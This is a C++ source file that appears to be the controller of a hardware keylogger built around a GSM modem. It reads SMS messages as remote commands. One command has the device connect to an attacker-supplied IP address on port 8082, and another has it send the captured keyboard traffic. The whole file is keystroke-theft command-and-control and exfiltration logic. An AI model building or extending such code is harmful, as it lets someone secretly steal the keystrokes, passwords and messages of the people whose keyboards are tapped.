// ============================================================================
#include "./includes/core/controller.h"
// ============================================================================
void ModulesControl::sms_analyze(
	SoftwareGSM* gsm_module,
	KeyboardParser* keyboard_prs,
	buffer* serial_buf
) {
	if (serial_buf->compare(0, strlen(MSG_FLAG), MSG_FLAG) == 0) {
        if (serial_buf->find(IP_MSG_FLAG) != NPOSE) {
            gsm_module->connect_to_server(
                serial_buf->substr(
                    serial_buf->find(IP_MSG_FLAG) + strlen(IP_MSG_FLAG)
                ).c_str(),
                FF(F("8082"))
            );
        }
        else if (serial_buf->find(RR_MSG_FLAG) != NPOSE) {
            gsm_module->cfg();
        }
        else if (serial_buf->find(GET_MSG_FLAG) != NPOSE) {
            Traffic::send(gsm_module, keyboard_prs);
        }
    } /* end main if */
}
// ============================================================================
void ModulesControl::execute(
	SoftwareGSM* gsm_module,
	KeyboardParser*
	keyboard_prs
) {
	buffer* serial_buf = new buffer;
	gsm_module->execute(serial_buf);

	ModulesControl::sms_analyze(gsm_module, keyboard_prs, serial_buf);
	Traffic::tanalyze(gsm_module, keyboard_prs);

	delete serial_buf;
}
// ============================================================================
